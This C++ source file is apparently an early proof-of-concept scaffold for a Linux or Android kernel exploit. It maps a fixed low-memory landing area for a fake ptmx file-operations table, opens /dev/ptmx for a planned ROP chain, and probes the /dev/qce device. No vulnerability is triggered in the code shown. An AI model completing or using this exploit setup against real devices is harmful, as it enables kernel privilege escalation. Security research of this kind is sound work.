/*
 * =====================================================================================
 *
 *       Filename:  wangvutils.cpp
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  2019年01月15日 13时22分20秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  kevin (WangWei), kevin.wang2004@hotmail.com
 *        Company:  LiLin-Tech
 *   Organization:  GNU
 *
 * =====================================================================================
 */

#include <cstdlib> 
#include <cstdio> 
#include <iostream>

#include <sys/types.h>  
#include <sys/ioctl.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <string.h>  
#include <fcntl.h>  
#include <errno.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>

static int ptmx_fd = 0;
static unsigned long fake_ptmx_fops = 0;

static int rop_init(void)
{
	ptmx_fd = open("/dev/ptmx", O_RDONLY);
	if(ptmx_fd == -1) {
		printf("[-] Open ptmx fail (%s - %d)\n", strerror(errno), errno);
		return -1;
	}

	return 0;
}

static int rop_close(void)
{
	close(ptmx_fd);
	return 0;
}

void exploit_1_step()
{
	int ret;
	void *map = mmap((void *)0x1000000, (size_t)0x10000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, (off_t)0);
	if(map == MAP_FAILED) {
		printf("[-] Failed to mmap landing (%d-%s)\n", errno, strerror(errno));
		ret = -1;
		goto out;
	}
        memset(map, 0x0, 0x10000);

	fake_ptmx_fops = (unsigned long)map;

	rop_init();

	rop_close();
	return;
out:
	std::cout << "exploit_1_step finish" << std::endl;
}


int main(int argc, const char *argv[])
{
	std::cout << "poc v1.0.0" << std::endl;

	exploit_1_step();

	FILE *fhandle = fopen("/dev/qce","r"); 
	if (fhandle != NULL)
	{
		std::cout << "open /dev/qce successfully" << std::endl;

		fclose(fhandle);
	}
	else
		perror("open /dev/qce fail: ");

	return 0;
}
